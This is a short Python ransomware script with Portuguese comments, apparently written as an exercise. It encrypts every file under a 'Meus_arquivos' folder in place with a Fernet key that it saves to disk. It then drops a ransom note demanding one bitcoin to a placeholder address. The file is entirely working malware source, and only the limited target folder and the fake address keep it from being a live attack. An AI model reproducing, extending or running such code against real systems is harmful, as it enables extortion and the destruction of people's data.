from cryptography.fernet import Fernet
import os

#gerar uma chave de criptografia e salvar 
def gerar_chave():
    chave = Fernet.generate_key()
    with open('chave.key', 'wb') as chave_file:
        chave_file.write(chave)

#carregar a chave salva
def carregar_chave():
    return open('chave.key','rb').read()

#criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, 'rb') as file:
        dados = file.read()
    dados_encriptografados = f.encrypt(dados)
    with open(arquivo, 'wb')as file:
        file.write(dados_encriptografados)

#encontrar arquivos para encripografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for name in arquivos:
            caminho = os.path.join(raiz, name)
            if name != "ransoware.py" and not name.endswith(".key"):
                lista.append(caminho)
    return lista

# menssagem de resgate 
def criar_mensagem():
    with open ("LEIA ISSO.TXT", 'w') as f:
        f.write('SEUS ARQUIVOS ACABAM DE SER CRIPTOGRAFADOS !\n')
        f.write('ENVIE UM BITCOIN PARA O ENDEREÇO 1FAKEransomAddressDoN0tUseInRealBTC99 E ENVIE O COMPROVANTE')    
        f.write('DEPOIS DISSO, ENVIAREMOS A CHAVE PARA RECUPERAÇÃO DE DADOS')

#EXECUÇÃO PRINCIPAL
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos('Meus_arquivos')
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem()
    print("RANSOWARE EXECUTADO ! ARQUIVOS CRIPTOGRAFADOS!")

if __name__ =="__main__":
    main()
